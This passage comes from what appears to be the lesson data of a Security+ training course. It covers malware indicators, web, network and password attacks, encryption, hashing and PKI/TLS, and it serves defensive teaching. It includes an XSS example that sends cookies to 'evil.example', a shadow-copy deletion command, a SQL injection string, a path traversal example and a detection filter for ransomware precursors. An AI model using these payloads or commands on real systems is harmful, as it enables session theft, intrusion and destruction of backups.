<li>Lateral movement — RDP, PsExec, remote management tools (AnyDesk, ScreenConnect).</li>
<li>Exfiltration — rclone or MEGA uploads of sensitive data.</li>
<li>Impact — delete shadow copies (<code>vssadmin delete shadows /all /quiet</code>), disable backups and security tools, encrypt.</li>
<li>Extortion — <b>double extortion</b> (pay or we publish your data), sometimes adding DDoS or contacting victims' customers.</li>
</ol>
<p>Time from initial access to encryption is often measured in days or even hours — which is why fast detection of steps 2–4 matters so much.</p>

<h3>Fileless and living-off-the-land</h3>
<p><b>Fileless</b> malware runs in memory or abuses built-in tools so that little or nothing malicious is written to disk. <b>LOLBins</b> (living-off-the-land binaries) are trusted Windows tools misused by attackers: <code>powershell.exe</code>, <code>rundll32.exe</code>, <code>mshta.exe</code>, <code>regsvr32.exe</code>, <code>certutil.exe -urlcache</code> (download), <code>wmic</code>, <code>bitsadmin</code>. Signature-based antivirus struggles with these; behavior-based EDR and good logging (4688 with command lines, Sysmon, 4104) are the answer.</p>

<h3>Indicators of malicious activity (SY0-701 2.4)</h3>
<table>
<tr><th>Indicator</th><th>What it might look like</th></tr>
<tr><td>Account lockouts</td><td>Spike in 4740 events — brute force or spraying</td></tr>
<tr><td>Concurrent session usage</td><td>Same user active from two countries at once</td></tr>
<tr><td>Impossible travel</td><td>Login from London, then Sydney 20 minutes later</td></tr>
<tr><td>Blocked content</td><td>Proxy blocking repeated requests to a malicious domain</td></tr>
<tr><td>Resource consumption</td><td>CPU pegged (cryptominer), disk I/O spike (encryption), bandwidth spike (exfiltration)</td></tr>
<tr><td>Resource inaccessibility</td><td>Files renamed with a new extension, ransom notes</td></tr>
<tr><td>Out-of-cycle logging</td><td>Logons or jobs at unusual times</td></tr>
<tr><td>Missing logs</td><td>Event 1102, gaps in the timeline</td></tr>
<tr><td>Published/documented</td><td>Your data appears on a leak site or paste site</td></tr>
</table>
<p>Specific technical artifacts are called <b>indicators of compromise (IoCs)</b>: file hashes, malicious IPs/domains/URLs, mutex names, registry keys, unusual user agents. They are useful but short-lived — attackers change infrastructure easily. Behavioral <b>indicators of attack (IoAs)</b>, such as "Office application spawns PowerShell that downloads a file", last much longer. (The Pyramid of Pain in p2-m7 formalizes this.)</p>
<pre><code># Quick host checks for ransomware precursors (Windows)
PS&gt; Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 2000 |
      Where-Object Message -match 'vssadmin|wbadmin|bcdedit|shadowcopy'</code></pre>
<div class="callout real"><b>On the job:</b> when EDR flags a file, you will check its SHA-256 on VirusTotal or your threat-intel platform, look at its signer and prevalence (how many hosts have it), review the process tree, and search the SIEM for the same hash or domain across the fleet. One infected machine is a ticket; ten is an incident.</div>
<div class="callout warn">Never upload potentially sensitive files (internal documents that might be weaponized) to public sandboxes — they become visible to other subscribers and to the attacker, who learns they have been detected. Search by hash first.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 2.4 "Given a scenario, analyze indicators of malicious activity" — malware attacks (ransomware, trojan, worm, spyware, bloatware, virus, keylogger, logic bomb, rootkit) and the indicator list above.</div>`,
  keyTerms: [
    ["Worm", "Self-replicating malware that spreads without user interaction"],
    ["Trojan", "Malware disguised as legitimate software"],
    ["Ransomware", "Malware that encrypts or steals data for extortion"],
    ["RaaS", "Ransomware-as-a-Service: developers rent ransomware to affiliates"],
    ["Double extortion", "Encrypting data and threatening to leak stolen copies"],
    ["Infostealer", "Malware that harvests credentials, cookies and wallets"],
    ["Logic bomb", "Malicious code triggered by a specific condition or time"],
    ["Fileless malware", "Malware operating in memory or via built-in tools with little disk footprint"],
    ["LOLBin", "Legitimate system binary abused for malicious purposes"],
    ["IoC", "Indicator of Compromise: artifact such as a hash, IP or domain linked to malicious activity"]
  ],
  standards: ["MITRE ATT&CK T1486", "MITRE ATT&CK T1490", "NIST SP 800-83 Rev. 1"]
},
{
  id: "p1-m2-l4",
  module: "p1-m2",
  title: "Application, Network and Password Attacks",
  minutes: 22,
  objectives: [
    "Explain injection, XSS, buffer overflow, race conditions and privilege escalation",
    "Describe DDoS, on-path, DNS and wireless attacks",
    "Distinguish brute force, password spraying, credential stuffing and offline cracking",
    "Map each attack to a primary mitigation"
  ],
  html: `<p>This lesson is a tour of the attacks you will see in alerts, vulnerability reports and exam questions. For each one, focus on <i>the mechanism</i> and <i>the best mitigation</i> — that pairing is what both the exam and the job require.</p>

<h3>Application attacks</h3>
<h4>Injection</h4>
<p>Injection happens when untrusted input is interpreted as code or commands. <b>SQL injection</b> is the classic:</p>
<pre><code>Input:  ' OR '1'='1' --
Query:  SELECT * FROM users WHERE name = '' OR '1'='1' --' AND pw = '...'
Result: condition always true -&gt; logs in as the first user</code></pre>
<p>Mitigation: <b>parameterized queries</b> (prepared statements), which keep data and code separate; plus input validation, least-privilege database accounts and a WAF as an extra layer. Related: OS command injection, LDAP injection, and in 2026 <b>prompt injection</b> against LLM-powered apps (covered in p4-m4).</p>

<h4>Cross-site scripting (XSS)</h4>
<p>The attacker gets their JavaScript to run in other users' browsers on a trusted site — for example a comment containing <code>&lt;script&gt;fetch('https://evil.example/c?'+document.cookie)&lt;/script&gt;</code>. Types: <b>stored</b> (saved on the server), <b>reflected</b> (in a crafted link) and <b>DOM-based</b>. Mitigation: context-aware output encoding, Content Security Policy, and <code>HttpOnly</code> cookies so scripts cannot read session tokens.</p>

<h4>Others to know</h4>
<ul>
<li><b>CSRF</b> (cross-site request forgery) — tricks a logged-in browser into sending an unwanted request. Mitigation: anti-CSRF tokens, <code>SameSite</code> cookies.</li>
<li><b>Buffer overflow</b> — writing past the end of a memory buffer to overwrite adjacent data or the return address. Mitigation: memory-safe languages (Rust, Go, C#, Java), bounds checking, ASLR, DEP, stack canaries.</li>
<li><b>Race condition / TOCTOU</b> — the state changes between a check and its use (time-of-check to time-of-use).</li>
<li><b>Directory traversal</b> — <code>../../etc/passwd</code> in a file path parameter.</li>
<li><b>Privilege escalation</b> — vertical (user → admin) or horizontal (user A → user B's data).</li>
<li><b>Replay</b> — resending captured valid traffic (tokens, authentication messages). Mitigation: nonces, timestamps, session expiry.</li>
<li><b>Forgery</b> — server-side request forgery (SSRF) makes a server fetch internal URLs, e.g. cloud metadata at <code>169.254.169.254</code>.</li>
</ul>

<h3>Network attacks</h3>
<table>
<tr><th>Attack</th><th>Mechanism</th><th>Primary mitigation</th></tr>
<tr><td><b>DDoS</b> — volumetric, protocol, application-layer</td><td>Overwhelm bandwidth, connection tables or app resources from many sources</td><td>Upstream scrubbing/CDN, rate limiting, autoscaling</td></tr>
<tr><td><b>Amplified/reflected DDoS</b></td><td>Spoofed requests to DNS/NTP/memcached reflectors</td><td>BCP 38 ingress filtering; close open resolvers</td></tr>
<tr><td><b>On-path</b> (man-in-the-middle)</td><td>Attacker intercepts/relays traffic (ARP spoofing, rogue AP)</td><td>TLS everywhere, HSTS, certificate validation</td></tr>
<tr><td><b>DNS attacks</b></td><td>Cache poisoning, domain hijacking, DNS tunneling</td><td>DNSSEC, registrar lock + MFA, DNS monitoring</td></tr>
<tr><td><b>Wireless</b></td><td>Evil twin, rogue AP, deauthentication, WPS PIN brute force</td><td>WPA3-Enterprise with 802.1X, wireless IDS, disable WPS</td></tr>
<tr><td><b>Credential replay</b></td><td>Pass-the-hash / pass-the-ticket</td><td>Credential Guard, tiered admin, disable NTLM</td></tr>
<tr><td><b>Malicious code over network</b></td><td>Worms, exploit kits</td><td>Patching, segmentation, IPS</td></tr>
</table>
<p>Physical-network relatives: <b>RFID cloning</b> of badges, <b>environmental</b> attacks (cutting power or HVAC), and <b>brute-force physical</b> entry.</p>

<h3>Password attacks</h3>
<table>
<tr><th>Attack</th><th>Pattern</th><th>Detection / mitigation</th></tr>
<tr><td><b>Brute force (online)</b></td><td>Many passwords against one account</td><td>Lockout/throttling (4740), MFA</td></tr>
<tr><td><b>Password spraying</b></td><td>One or two common passwords (<code>Autumn2026!</code>) against many accounts, slowly to avoid lockouts</td><td>Failures across many users from one source; banned-password lists; MFA</td></tr>
<tr><td><b>Credential stuffing</b></td><td>Username/password pairs leaked from other sites, tried at scale</td><td>Breached-password screening, MFA, bot detection</td></tr>
<tr><td><b>Offline cracking</b></td><td>Stolen hashes cracked with GPUs (hashcat) using wordlists, rules and masks</td><td>Slow salted hashes (Argon2id, bcrypt), long passphrases</td></tr>
<tr><td><b>Dictionary / hybrid</b></td><td>Wordlist words plus mutations (<code>P@ssw0rd1</code>)</td><td>Length over complexity; blocklists</td></tr>
<tr><td><b>Rainbow tables</b></td><td>Precomputed hash lookups</td><td>Defeated by salting</td></tr>
</table>
<div class="callout real"><b>On the job — spraying vs brute force in the logs:</b>
<pre><code>Brute force: 4625 x 600, TargetUserName=jsmith, 1 source IP, 10 minutes
Spraying:    4625/4771 x 600, 600 DIFFERENT users, 1 attempt each, 1-3 source IPs
Stuffing:    Many users, many source IPs (residential proxies), mixed success</code></pre>
The most important follow-up for all three: did any attempt <b>succeed</b>? Search for 4624 or a cloud sign-in success from the same sources.</div>

<h3>Cryptographic attacks (preview)</h3>
<ul>
<li><b>Downgrade</b> — forcing a weaker protocol/cipher (e.g. POODLE against SSL 3.0).</li>
<li><b>Collision</b> — two inputs with the same hash (practical for MD5 and SHA-1).</li>
<li><b>Birthday attack</b> — the probability math that makes collisions easier than expected.</li>
</ul>
<p>You will study these in p1-m3.</p>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 2.3 "Explain various types of vulnerabilities" (memory injection, buffer overflow, race conditions, SQLi, XSS, zero-day, misconfiguration, cloud and supply chain) and 2.4 (network, application, cryptographic and password attacks). OWASP Top 10 categories underpin the application items.</div>`,
  keyTerms: [
    ["SQL injection", "Inserting SQL through untrusted input to manipulate database queries"],
    ["Parameterized query", "Prepared statement that keeps user data separate from SQL code"],
    ["XSS", "Cross-site scripting: injecting script that runs in other users' browsers"],
    ["Buffer overflow", "Writing beyond a buffer's bounds to corrupt memory or control execution"],
    ["TOCTOU", "Race condition between checking a resource and using it"],
    ["DDoS", "Distributed denial of service from many sources"],
    ["On-path attack", "Intercepting and possibly altering communication between two parties"],
    ["Password spraying", "Few passwords tried against many accounts to evade lockout"],
    ["Credential stuffing", "Replaying breached username/password pairs against other services"],
    ["Salt", "Random per-password value added before hashing to defeat precomputed tables"]
  ],
  standards: ["OWASP Top 10", "CWE-89", "CWE-79", "BCP 38 (RFC 2827)"]
}
);

// ===================== p1-m3 Cryptography & PKI =====================
CP.lessons.push(
{
  id: "p1-m3-l1",
  module: "p1-m3",
  title: "Encryption Fundamentals: Symmetric, Asymmetric and Key Exchange",
  minutes: 22,
  objectives: [
    "Contrast symmetric and asymmetric encryption and when each is used",
    "Describe AES, its key sizes and why the mode of operation (GCM vs ECB) matters",
    "Explain RSA, elliptic-curve cryptography and Diffie-Hellman key exchange",
    "Protect data at rest, in transit and in use, and explain tokenization, obfuscation and steganography"
  ],
  html: `<p>Cryptography provides confidentiality (encryption), integrity (hashing, MACs) and authenticity and non-repudiation (digital signatures). You do not need to do the math, but you must know which tool solves which problem, which algorithms are current, and which are broken. This lesson covers encryption; the next covers hashing and signatures.</p>

<h3>Core vocabulary</h3>
<ul>
<li><b>Plaintext</b> → encryption with a <b>key</b> → <b>ciphertext</b> → decryption → plaintext.</li>
<li><b>Algorithm (cipher)</b> — the public mathematical procedure. Security must rest on the secrecy of the key, not the algorithm (<b>Kerckhoffs's principle</b>).</li>
<li><b>Key length</b> — longer keys mean exponentially more work to brute force (each extra bit doubles it).</li>
</ul>

<h3>Symmetric encryption</h3>
<p>One shared secret key encrypts and decrypts. It is fast and suitable for bulk data. The problem is <b>key distribution</b>: how do two parties agree on a secret key over an untrusted network? And with n parties, you need n(n−1)/2 keys.</p>
<table>
<tr><th>Algorithm</th><th>Status</th><th>Notes</th></tr>
<tr><td><b>AES</b> (FIPS 197)</td><td>Current standard</td><td>128-bit block; 128, 192 or 256-bit keys; hardware-accelerated (AES-NI)</td></tr>
<tr><td><b>ChaCha20-Poly1305</b> (RFC 8439)</td><td>Current</td><td>Stream cipher + MAC; fast on devices without AES hardware; used in TLS 1.3, WireGuard</td></tr>
<tr><td>3DES</td><td>Disallowed by NIST after 2023</td><td>Legacy only</td></tr>
<tr><td>DES, RC4, Blowfish</td><td>Broken / obsolete</td><td>DES's 56-bit key is brute-forced trivially; RC4 is prohibited in TLS (RFC 7465)</td></tr>
</table>
<h4>Modes of operation</h4>
<p>A block cipher encrypts 16-byte blocks; the <b>mode</b> defines how blocks are chained. <b>ECB</b> encrypts identical blocks to identical ciphertext, leaking patterns (the famous "ECB penguin" image) — never use it. <b>CBC</b> chains blocks with an IV but needs a separate MAC. <b>GCM</b> (Galois/Counter Mode, NIST SP 800-38D) is <b>authenticated encryption (AEAD)</b>: it provides confidentiality and integrity together and is the default in TLS 1.3. Reusing a nonce with the same GCM key is catastrophic, so libraries handle nonces for you.</p>

<h3>Asymmetric (public-key) encryption</h3>
<p>Each party has a <b>key pair</b>: a <b>public key</b> shared freely and a <b>private key</b> kept secret. What one key encrypts, only the other can decrypt.</p>
<ul>
<li><b>Encrypt to someone</b>: use <i>their public key</i> → only their private key decrypts (confidentiality).</li>
<li><b>Sign something</b>: use <i>your private key</i> → anyone verifies with your public key (authenticity, integrity, non-repudiation).</li>
</ul>
<table>
<tr><th>Algorithm</th><th>Based on</th><th>Typical sizes</th></tr>
<tr><td><b>RSA</b></td><td>Difficulty of factoring large numbers</td><td>2048-bit minimum today; 3072-bit for ~128-bit security (NIST SP 800-57)</td></tr>
<tr><td><b>ECC</b> (ECDSA, ECDH; curves P-256, P-384, Curve25519/Ed25519)</td><td>Elliptic-curve discrete logarithm</td><td>256-bit ECC ≈ 3072-bit RSA security, with much smaller keys</td></tr>
<tr><td><b>Diffie-Hellman</b> (DH/ECDH)</td><td>Discrete logarithm</td><td>Key agreement, not encryption</td></tr>
</table>
<p>Asymmetric operations are roughly 1,000× slower than symmetric ones, so real systems use a <b>hybrid</b> approach: asymmetric crypto to authenticate and agree on a key, symmetric crypto (AES-GCM) for the data. TLS, SSH, PGP and S/MIME all work this way.</p>

<h3>Diffie-Hellman and forward secrecy</h3>
<p>Diffie-Hellman lets two parties derive the same shared secret over a public channel without ever sending it. In <b>ephemeral</b> mode (DHE/ECDHE), fresh key pairs are generated for every session and discarded afterwards. That gives <b>perfect forward secrecy (PFS)</b>: if the server's long-term private key is stolen next year, recorded past sessions still cannot be decrypted. TLS 1.3 requires ephemeral key exchange for exactly this reason.</p>
<div class="callout warn">Plain DH is unauthenticated and vulnerable to an on-path attacker who runs a separate exchange with each side. That is why the exchange is authenticated with certificates and signatures (next lessons).</div>

<h3>Protecting data in its three states</h3>
<table>
<tr><th>State</th><th>Controls</th></tr>
<tr><td><b>At rest</b></td><td>Full-disk encryption (BitLocker, FileVault, LUKS), volume/partition encryption, file encryption (EFS), database encryption (TDE, column-level), cloud storage encryption with KMS keys</td></tr>
<tr><td><b>In transit</b></td><td>TLS 1.2/1.3, IPsec and WireGuard VPNs, SSH</td></tr>
<tr><td><b>In use</b></td><td>Memory protections, confidential computing (secure enclaves like Intel TDX, AMD SEV-SNP), homomorphic encryption (emerging)</td></tr>
</table>
<pre><code># Encrypt and decrypt a file with AES-256 (password-derived key) using OpenSSL
$ openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt -in report.pdf -out report.pdf.enc
$ openssl enc -d -aes-256-cbc -pbkdf2 -iter 600000 -in report.pdf.enc -out report.pdf
# For real file encryption with authentication prefer age or GPG:
$ age -p -o report.pdf.age report.pdf</code></pre>

<h3>Key management is the hard part</h3>
<p>Strong algorithms fail if keys are mishandled. Good practice: generate keys with a cryptographically secure random number generator; store them in an <b>HSM</b>, TPM or cloud <b>KMS</b>; rotate on schedule and immediately on suspected compromise; separate duties so no single admin holds everything; and plan for <b>key escrow/recovery</b> (e.g. BitLocker recovery keys backed up to AD or Entra ID). Lost keys mean lost data — ransomware is, after all, encryption where only the criminal has the key.</p>

<h3>Related concepts on the exam</h3>
<ul>
<li><b>Obfuscation</b> — making data hard to understand without strong cryptographic protection (code obfuscation, Base64).</li>
<li><b>Tokenization</b> — replacing sensitive data (a card number) with a random token; the mapping lives in a secure vault. Widely used for PCI DSS scope reduction.</li>
<li><b>Data masking</b> — showing only part of the data (<code>**** **** **** 4242</code>).</li>
<li><b>Steganography</b> — hiding data inside other data such as images or audio; used for covert exfiltration.</li>
<li><b>Blockchain / open public ledger</b> — append-only, cryptographically chained records providing integrity.</li>
</ul>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 1.4 "Explain the importance of using appropriate cryptographic solutions" — encryption levels (full-disk, partition, file, volume, database, record), transport encryption, symmetric vs asymmetric, key exchange, algorithms and key length, TPM/HSM/KMS/secure enclave, obfuscation (steganography, tokenization, masking), blockchain. Also 3.3 "data states".</div>`,
  keyTerms: [
    ["Symmetric encryption", "One shared key encrypts and decrypts; fast, used for bulk data"],
    ["Asymmetric encryption", "Public/private key pair; solves key distribution and enables signatures"],
    ["AES", "Advanced Encryption Standard (FIPS 197): 128-bit block, 128/192/256-bit keys"],
    ["GCM", "Galois/Counter Mode: authenticated encryption providing confidentiality and integrity"],
    ["ECB", "Insecure block mode that leaks patterns; never use"],
    ["RSA", "Asymmetric algorithm based on factoring; 2048-bit minimum"],
    ["ECC", "Elliptic-curve cryptography offering strong security with small keys"],
    ["Diffie-Hellman", "Key-agreement method deriving a shared secret over a public channel"],
    ["Perfect forward secrecy", "Ephemeral session keys protect past sessions even if long-term keys leak"],
    ["Tokenization", "Replacing sensitive data with a non-sensitive token mapped in a vault"]
  ],
  standards: ["FIPS 197", "NIST SP 800-38D", "NIST SP 800-57 Part 1 Rev. 5", "RFC 8439", "RFC 7465"],
  labs: ["lab-crypto-hash"]
},
{
  id: "p1-m3-l2",
  module: "p1-m3",
  title: "Hashing, Salting, MACs and Digital Signatures",
  minutes: 20,
  objectives: [
    "Explain the properties of a cryptographic hash function",
    "Identify current and deprecated hash algorithms",
    "Describe how passwords should be stored (salt, pepper, slow KDFs)",
    "Explain HMAC and digital signatures and the security services each provides"
  ],
  html: `<p>A <b>hash function</b> turns input of any size into a fixed-size value — the <b>digest</b>. Hashes are everywhere in security: verifying downloads, identifying malware samples, storing passwords, signing certificates and code, and proving evidence was not altered.</p>

<h3>Properties of a cryptographic hash</h3>
<ul>
<li><b>Deterministic</b> — the same input always gives the same output.</li>
<li><b>Fixed length</b> — SHA-256 always produces 256 bits (64 hex characters).</li>
<li><b>One-way (pre-image resistance)</b> — you cannot recover the input from the hash.</li>
<li><b>Collision resistance</b> — it is infeasible to find two inputs with the same hash.</li>
<li><b>Avalanche effect</b> — changing one bit changes about half the output bits.</li>
</ul>
<pre><code>$ echo -n "invoice" | sha256sum
6a1a4b3c... (64 hex chars)
$ echo -n "Invoice" | sha256sum
completely different 64 hex chars
$ sha256sum update.exe                       # Linux
PS&gt; Get-FileHash .\\update.exe -Algorithm SHA256   # Windows
C:\\&gt; certutil -hashfile update.exe SHA256</code></pre>
<p>Hashing is not encryption: there is no key and no way to "decrypt" a hash. Attackers "crack" password hashes by guessing inputs and comparing results.</p>

<h3>Which algorithms?</h3>
<table>
<tr><th>Algorithm</th><th>Output</th><th>Status</th></tr>
<tr><td>MD5</td><td>128-bit</td><td><b>Broken</b> — collisions are trivial; still seen as a malware identifier, never for security</td></tr>
<tr><td>SHA-1</td><td>160-bit</td><td><b>Broken</b> for collisions (SHAttered, 2017); NIST is retiring it by 2030</td></tr>
<tr><td>SHA-2 family: SHA-256, SHA-384, SHA-512 (FIPS 180-4)</td><td>256–512-bit</td><td>Current standard</td></tr>
<tr><td>SHA-3 family (FIPS 202)</td><td>224–512-bit</td><td>Current; different internal design (Keccak) as a hedge</td></tr>
</table>
<p>The <b>birthday paradox</b> means collisions are found after about 2<sup>n/2</sup> attempts, not 2<sup>n</sup> — so a 128-bit hash gives only about 64 bits of collision resistance. That math is why MD5 fell and why we use SHA-256 or larger.</p>

<h3>Storing passwords correctly</h3>
<p>Fast hashes like SHA-256 are <b>bad</b> for passwords: a modern GPU computes billions per second. Correct password storage uses:</p>
<ul>
<li>A unique random <b>salt</b> per password (stored next to the hash), so identical passwords produce different hashes and precomputed <b>rainbow tables</b> are useless.</li>
<li>A deliberately <b>slow, memory-hard key-derivation function</b>: <b>Argon2id</b> (RFC 9106, OWASP's first choice), <b>scrypt</b>, <b>bcrypt</b>, or <b>PBKDF2</b> with a high iteration count (OWASP suggests 600,000 iterations for PBKDF2-HMAC-SHA256). NIST SP 800-63B requires salted, iterated one-way storage with an approved KDF.</li>
<li>Optionally a <b>pepper</b> — a secret value kept outside the database (e.g. in an HSM) so a stolen database alone is not enough.</li>
</ul>
<pre><code>$argon2id$v=19$m=65536,t=3,p=4$c2FsdHNhbHQ$...hash...
 algorithm  ver  memory/time/parallelism  salt  hash</code></pre>
<div class="callout real"><b>On the job:</b> remember from p0-m4 that Windows NT hashes are <i>unsalted</i> MD4. That is why pass-the-hash works and why a cracked NT hash for one account reveals the same password everywhere it is reused. It is also why long passphrases matter so much for Windows accounts.</div>

<h3>Message authentication codes (HMAC)</h3>
<p>A plain hash proves nothing about <i>who</i> created a message: an attacker who modifies it can simply recompute the hash. An <b>HMAC</b> (RFC 2104, FIPS 198-1) mixes a secret key into the hash: only someone with the key can produce a valid tag. HMAC gives <b>integrity and authentication</b> between parties sharing a key — used in API request signing, JWTs (HS256) and VPN/TLS record protection — but <b>not non-repudiation</b>, since both sides hold the key.</p>
<pre><code>$ echo -n '{"amount":100}' | openssl dgst -sha256 -hmac "s3cr3tkey"</code></pre>

<h3>Digital signatures</h3>
<p>A <b>digital signature</b> combines hashing with asymmetric crypto:</p>
<ol>
<li>The signer hashes the message (e.g. SHA-256).</li>
<li>The signer encrypts/signs that hash with their <b>private key</b> → the signature.</li>
<li>The verifier hashes the received message, and uses the signer's <b>public key</b> to check the signature against that hash.</li>
</ol>
<p>If it verifies, the message is unchanged (<b>integrity</b>), came from the private-key holder (<b>authenticity</b>) and the signer cannot plausibly deny it (<b>non-repudiation</b>). Algorithms: RSA-PSS, ECDSA, EdDSA (Ed25519) — specified in FIPS 186-5 — and the new post-quantum ML-DSA (FIPS 204). Signatures are used for code signing (Authenticode, Apple notarization), document signing, certificates, DNSSEC, software updates and email (DKIM, S/MIME).</p>
<table>
<tr><th>Tool</th><th>Integrity</th><th>Authentication</th><th>Non-repudiation</th><th>Confidentiality</th></tr>
<tr><td>Hash</td><td>Yes (if hash is protected)</td><td>No</td><td>No</td><td>No</td></tr>
<tr><td>HMAC</td><td>Yes</td><td>Yes (shared key)</td><td>No</td><td>No</td></tr>
<tr><td>Digital signature</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td></tr>
<tr><td>Encryption (AEAD)</td><td>Yes (GCM)</td><td>Partly</td><td>No</td><td>Yes</td></tr>
</table>
<div class="callout tip">Code signing proves <i>who</i> signed, not that the code is safe. Attackers steal signing certificates and abuse signed-but-vulnerable drivers. Treat "signed" as one input to your verdict, not the verdict.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 1.4 (hashing, salting, digital signatures, key stretching) and 2.4 (cryptographic attacks: collision, birthday, downgrade). Classic question: "Which provides non-repudiation?" → digital signature. "Which defeats rainbow tables?" → salting.</div>`,
  keyTerms: [
    ["Hash function", "One-way function producing a fixed-length digest from any input"],
    ["Collision", "Two different inputs producing the same hash"],
    ["SHA-256", "SHA-2 family hash with a 256-bit output (FIPS 180-4)"],
    ["Salt", "Unique random value combined with each password before hashing"],
    ["Pepper", "Secret value stored separately from the password database"],
    ["Key stretching", "Making hashing deliberately slow (Argon2id, bcrypt, PBKDF2)"],
    ["Rainbow table", "Precomputed hash-to-password lookup table, defeated by salting"],
    ["HMAC", "Keyed hash providing integrity and authentication"],
    ["Digital signature", "Hash signed with a private key; gives integrity, authenticity, non-repudiation"],
    ["Birthday attack", "Exploits probability to find collisions in about 2^(n/2) attempts"]
  ],
  standards: ["FIPS 180-4", "FIPS 202", "FIPS 198-1", "FIPS 186-5", "RFC 2104", "RFC 9106", "NIST SP 800-63B"],
  labs: ["lab-crypto-hash", "lab-password-policy"]
},
{
  id: "p1-m3-l3",
  module: "p1-m3",
  title: "PKI, Certificates and TLS 1.3",
  minutes: 22,
  objectives: [
    "Explain how certificate authorities and chains of trust work",
    "Read the key fields of an X.509 certificate",
    "Describe certificate lifecycle: CSR, issuance, revocation (CRL/OCSP), renewal and shrinking lifetimes",
    "Walk through a TLS 1.3 handshake and inspect a certificate with OpenSSL"
  ],
  html: `<p>Public-key cryptography has one big problem: how do you know a public key really belongs to <code>yourbank.com</code> and not to an attacker? <b>Public Key Infrastructure (PKI)</b> answers it with trusted third parties that vouch for keys by signing <b>certificates</b>.</p>

<h3>Certificates and certificate authorities</h3>
<p>An <b>X.509 certificate</b> (RFC 5280) binds a public key to an identity, and is signed by a <b>Certificate Authority (CA)</b>. Trust works as a chain:</p>
<pre><code>Root CA (self-signed, in your OS/browser trust store, kept offline)
  └── Intermediate CA (signed by root; does day-to-day issuing)
        └── Leaf certificate: www.example.com (signed by intermediate)</code></pre>
<p>Your browser trusts a site certificate because it can verify each signature up to a root it already trusts. Servers must send the intermediate(s); a missing intermediate is a common misconfiguration. Organizations also run <b>private/internal CAs</b> (e.g. Active Directory Certificate Services) for internal sites, Wi-Fi 802.1X and smart cards — and misconfigured AD CS templates are a well-known domain escalation path (the "ESC" attacks).</p>

<h3>Key certificate fields</h3>
<table>
<tr><th>Field</th><th>Meaning</th></tr>
<tr><td>Subject / Subject Alternative Name (SAN)</td><td>Who the cert is for. Browsers use the <b>SAN</b> list of DNS names; the Common Name is legacy</td></tr>
<tr><td>Issuer</td><td>The CA that signed it</td></tr>
<tr><td>Validity (Not Before / Not After)</td><td>Lifetime</td></tr>
<tr><td>Public key + algorithm</td><td>e.g. ECDSA P-256 or RSA 2048</td></tr>
<tr><td>Serial number</td><td>Unique per CA; used for revocation</td></tr>
<tr><td>Key Usage / Extended Key Usage</td><td>What it may do: server auth, client auth, code signing, email</td></tr>
<tr><td>Signature algorithm</td><td>e.g. sha256WithRSAEncryption</td></tr>
</table>
<p>Variants: <b>wildcard</b> (<code>*.example.com</code> — convenient but a single key compromise affects every subdomain), <b>SAN/multi-domain</b>, <b>self-signed</b> (no third-party trust; fine for labs, a warning sign in production), and validation levels DV, OV and EV.</p>

<h3>Lifecycle</h3>
<ol>
<li>Generate a key pair and a <b>CSR</b> (Certificate Signing Request) containing the public key and identity.</li>
<li>The CA validates control of the domain (for public certs, via ACME challenges, DNS or HTTP) and issues the certificate.</li>
<li>Deploy, monitor expiry, renew.</li>
<li><b>Revoke</b> if the private key is compromised. Clients check revocation using a <b>CRL</b> (Certificate Revocation List) or <b>OCSP</b> (Online Certificate Status Protocol, with <b>OCSP stapling</b> to avoid privacy and performance problems).</li>
</ol>
<p>The industry is moving fast here. Let's Encrypt shut down its OCSP service in 2025 in favor of CRLs, and the CA/Browser Forum passed ballot SC-081 in April 2025 to shrink maximum public TLS certificate lifetimes: <b>200 days from 15 March 2026</b>, <b>100 days from March 2027</b> and <b>47 days from March 2029</b>. Manual renewal is no longer viable — automation with <b>ACME</b> (RFC 8555) is now mandatory practice, and expired certificates remain one of the most common causes of outages.</p>
<div class="callout tip"><b>Certificate Transparency</b> (RFC 6962) requires public CAs to log every certificate they issue in public append-only logs. Defenders monitor CT logs (e.g. via crt.sh) to spot certificates issued for their domains — or look-alike phishing domains — that they did not request.</div>

<h3>TLS 1.3 in brief</h3>
<p>TLS 1.3 (RFC 8446) is the current protocol securing HTTPS, modern email and many APIs. Compared with TLS 1.2 it removed static RSA key exchange, CBC ciphers, RC4, SHA-1 and compression, requires forward secrecy and completes in <b>one round trip</b>:</p>
<ol>
<li><b>ClientHello</b> — supported cipher suites (e.g. <code>TLS_AES_128_GCM_SHA256</code>), the server name (SNI) and the client's ephemeral key share (X25519 — or, increasingly, the hybrid post-quantum <code>X25519MLKEM768</code>).</li>
<li><b>ServerHello</b> — chosen suite and the server's key share. Both sides now derive session keys; everything after is encrypted.</li>
<li>Server sends its <b>certificate</b> and a <b>CertificateVerify</b> signature proving it holds the private key, then <b>Finished</b>.</li>
<li>Client verifies the chain, hostname, validity and signature, sends <b>Finished</b>, and application data flows.</li>
</ol>
<p>SSL 2.0/3.0 and TLS 1.0/1.1 are deprecated (RFC 8996) and should be disabled; TLS 1.2 remains acceptable with AEAD ciphers and ECDHE.</p>
<pre><code># Inspect a site's certificate chain and negotiated protocol
$ openssl s_client -connect example.com:443 -servername example.com &lt;/dev/null 2&gt;/dev/null \\
    | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
# Check which protocol and cipher were negotiated
$ openssl s_client -connect example.com:443 -tls1_3 &lt;/dev/null | grep -E "Protocol|Cipher"
# Create a key and CSR
$ openssl req -new -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \\
    -keyout web.key -out web.csr -subj "/CN=www.example.com"</code></pre>
<div class="callout real"><b>On the job:</b> TLS hides content from network sensors, so SOCs rely on metadata: SNI, certificate issuer and age, JA3/JA4 client fingerprints and destination reputation. A self-signed or days-old certificate on a rarely seen domain contacted by a single workstation is a classic C2 indicator. Some organizations perform <b>TLS inspection</b> with a trusted internal CA on a proxy — powerful, but it concentrates risk and has privacy implications.</div>
<div class="callout warn"><b>Certificate pinning</b> (hard-coding expected keys in an app) blocks interception but breaks when certificates rotate; with 47-day lifetimes coming, pin to CA or public key carefully, if at all.</div>
